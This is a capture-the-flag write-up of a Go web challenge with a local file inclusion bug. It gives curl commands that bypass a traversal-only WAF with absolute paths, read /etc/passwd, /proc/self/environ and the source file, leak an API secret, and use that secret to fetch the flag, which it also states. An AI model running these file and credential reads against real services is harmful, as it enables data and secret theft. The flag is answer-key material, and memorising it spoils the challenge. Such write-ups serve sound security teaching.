# Penetrable Tanish

## Challenge Overview
- Event: CyberGeek CTF
- Category: Web / LFI
- Final Flag: geek{i_am_6atman}

## Executive Summary
The `/api/read` endpoint accepts an arbitrary file path through the `file` query parameter and reads it with `os.ReadFile`. Its WAF only blocks paths containing `../`, `..%2f`, or the word `batman`. Absolute paths are not blocked, so `/proc/self/environ` can be read directly.

The leaked environment contains `CTF_CORE_SECRET_KEY=production_secret_key_99`. The source code in `/proc/self/cwd/main.go` shows that `/api/flag` checks the `X-API-Key` header against that environment variable. Supplying the leaked key returns the flag.

## Solution Walkthrough
### Recon
The public read endpoint showed the service banner:

```bash
curl 'https://ctf-lfi-ctf-lfi.vinm.me/api/read?file=public/readme.txt'
```

Output:

```text
Welcome to the public file server. Nothing secret here.
I love Golang btw
```

The response header also claimed `X-Powered-By: Go-Fiber/v2.1`, but the recovered source later showed the app actually used Go's `net/http`.

### Vulnerability
A normal traversal attempt is blocked:

```bash
curl 'https://ctf-lfi-ctf-lfi.vinm.me/api/read?file=../../etc/passwd'
```

Output:

```text
WAF ALERT: Directory traversal detected. Incident logged.
```

However, an absolute path works:

```bash
curl 'https://ctf-lfi-ctf-lfi.vinm.me/api/read?file=/etc/passwd'
```

That confirms arbitrary absolute file read.

### Secret Leak
Read the process environment:

```bash
curl 'https://ctf-lfi-ctf-lfi.vinm.me/api/read?file=/proc/self/environ' | xxd
```

Relevant leaked value:

```text
CTF_CORE_SECRET_KEY=production_secret_key_99
```

The source was also readable from the process cwd:

```bash
curl 'https://ctf-lfi-ctf-lfi.vinm.me/api/read?file=/proc/self/cwd/main.go'
```

Relevant code:

```go
AdminApiKey = os.Getenv("CTF_CORE_SECRET_KEY")
...
apiKey := r.Header.Get("X-API-Key")
if apiKey == AdminApiKey {
    flagdata, err := os.ReadFile("batman.txt")
    fmt.Fprintf(w, "Congratulations! Flag: %s\n", string(flagdata))
}
```

### Exploit
Use the leaked key as the admin API key:

```bash
curl -H 'X-API-Key: production_secret_key_99' \
  'https://ctf-lfi-ctf-lfi.vinm.me/api/flag'
```

Output:

```text
Congratulations! Flag: geek{i_am_6atman}
```

## Flag
```text
geek{i_am_6atman}
```
